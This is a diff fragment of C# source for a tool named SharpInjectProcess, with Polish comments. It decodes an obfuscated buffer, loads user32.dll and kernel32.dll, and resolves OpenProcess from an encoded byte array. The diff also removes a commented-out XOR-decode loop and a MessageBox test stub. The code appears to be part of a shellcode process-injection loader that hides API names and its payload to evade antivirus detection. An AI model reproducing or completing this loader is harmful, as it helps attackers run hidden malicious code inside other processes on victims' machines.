@@ -117,23 +117,12 @@ namespace SharpInjectProcess
             buf = helloworld(buf, "siemanko");
 
             int buflen = buf.Length + 1;
-            //for (int i = 0; i < buf.Length; i++)
-            //{
-            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
-            //}
 
             // Zaladowanie biblioteki user32.dll i kernel32.dll
             string user32dll = "user32.dll";
             string kernel32dll = "kernel32.dll";
             IntPtr huser32dll = LoadLibrary(user32dll);
             IntPtr hkernel32dll = LoadLibrary(kernel32dll);
-
-            // Znalezienie wskaznika na funkcje MessageBoxA
-            //string strMessageBox = "MessageBoxA";
-            //IntPtr hMessageBox = GetProcAddress(huser32dll, strMessageBox);
-            //Type_MessageBox mb = (Type_MessageBox)Marshal.GetDelegateForFunctionPointer(hMessageBox, typeof(Type_MessageBox));
-            //mb(IntPtr.Zero, "Justtest", "Justfortest", 0);
-
 
             // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
             byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
